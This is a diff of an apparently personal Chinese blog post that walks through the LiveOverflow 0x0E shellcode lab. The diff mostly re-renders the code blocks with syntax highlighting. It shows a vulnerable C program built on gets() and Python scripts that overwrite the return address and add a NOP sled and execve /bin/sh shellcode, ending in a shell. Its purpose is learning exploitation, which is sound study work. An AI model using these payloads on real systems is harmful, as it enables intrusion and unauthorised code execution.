@@ -96,7 +96,7 @@
 <meta property="og:image" content="https://i.imgur.com/OCdFu4x.jpg">
 <meta property="og:image" content="https://i.imgur.com/XZCxXXM.png">
 <meta property="og:image" content="https://i.imgur.com/Rjo0xJh.png">
-<meta property="og:updated_time" content="2018-10-07T03:09:23.896Z">
+<meta property="og:updated_time" content="2018-10-17T14:46:29.192Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Liveoverflow-0x0E-Shellcode">
 <meta name="twitter:description" content="本篇博文是关于shellcode的学习，视频前前后后看了十几遍，里面的步骤也跟着做了十几遍，总算是有点眉目了。">
@@ -343,16 +343,8 @@
 <li>if debugging the shellcode, use\xcc (int3) to stop the program executing and return to the debugger</li>
 <li>remove the int3s once your shellcode is done.</li>
 </ul>
-<pre><code>#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-int main(int argc, char **argv)
-{
-  char buffer[64];
-  gets(buffer);
-}
-</code></pre><hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
 <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先看源码，很短，就一个gets。放到gdb里面看一下</p>
 <p><img src="https://i.imgur.com/ZmZuJOs.png" alt=""></p>
 <p>首先要弄清楚绿框内的东西是什么意思，这被称为<strong>Calling Convention</strong>(函数调用约定)，也就是说下面call所调用的gets函数的参数要从绿框所指定的地址里面获取，也就是<strong>esp+0x10</strong>这个地址，被<strong>mov DWORD PTR  [esp],eax</strong> 放在了栈顶的位置。</p>
@@ -360,12 +352,8 @@ int main(int argc, char **argv)
 <p>接下来继续单步执行到call命令之前</p>
 <p><img src="https://i.imgur.com/IMyTgX4.png" alt=""></p>
 <p>从刚才说的可以知道，绿框内的指令将gets所需要的参数的开始的地址放在了栈顶(红框)，因此蓝箭头所指就是字符串存放的位置。黄框就是刚刚记下的ret的地址，从蓝箭头到黄框有20*4字节，现在可以来写个脚本试试了。</p>
-<pre><code>import struct
-padding = &quot;A&quot;*4*19
-ret = struct.pack(&quot;I&quot;, 0xbffff7c0)
-payload = &quot;\xcc&quot;*4 #int3
-print padding + ret + payload
-</code></pre><p><img src="https://i.imgur.com/a7OaI5m.png" alt=""><br>成功将ret地址覆盖！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">4</span>*<span class="number">19</span></span><br><span class="line">ret = struct.pack(<span class="string">"I"</span>, <span class="number">0xbffff7c0</span>)</span><br><span class="line">payload = <span class="string">"\xcc"</span>*<span class="number">4</span> <span class="comment">#int3</span></span><br><span class="line"><span class="keyword">print</span> padding + ret + payload</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/a7OaI5m.png" alt=""><br>成功将ret地址覆盖！</p>
 <p>我们运行试试</p>
 <p><img src="https://i.imgur.com/0CefmJe.png" alt=""></p>
 <p>得到的结果是<strong>Illegal instruction</strong>(非法指令)。什么意思呢？</p>
@@ -384,13 +372,8 @@ print padding + ret + payload
 &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;
 &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;
 </code></pre><p>然后直接扔到脚本里面就行了</p>
-<pre><code>import struct
-padding = &quot;A&quot;*4*19
-ret = struct.pack(&quot;I&quot;, 0xbffff7c0+32)
-nop = &quot;\x90&quot;*100
-payload = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;
-print padding + ret + nop + payload
-</code></pre><p>然后我们尝试运行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">4</span>*<span class="number">19</span></span><br><span class="line">ret = struct.pack(<span class="string">"I"</span>, <span class="number">0xbffff7c0</span>+<span class="number">32</span>)</span><br><span class="line">nop = <span class="string">"\x90"</span>*<span class="number">100</span></span><br><span class="line">payload = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line"><span class="keyword">print</span> padding + ret + nop + payload</span><br></pre></td></tr></table></figure>
+<p>然后我们尝试运行</p>
 <p><img src="https://i.imgur.com/Rjo0xJh.png" alt=""></p>
 <p>成功拿到shell！！XD</p>
 
@@ -512,7 +495,7 @@ print padding + ret + nop + payload
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
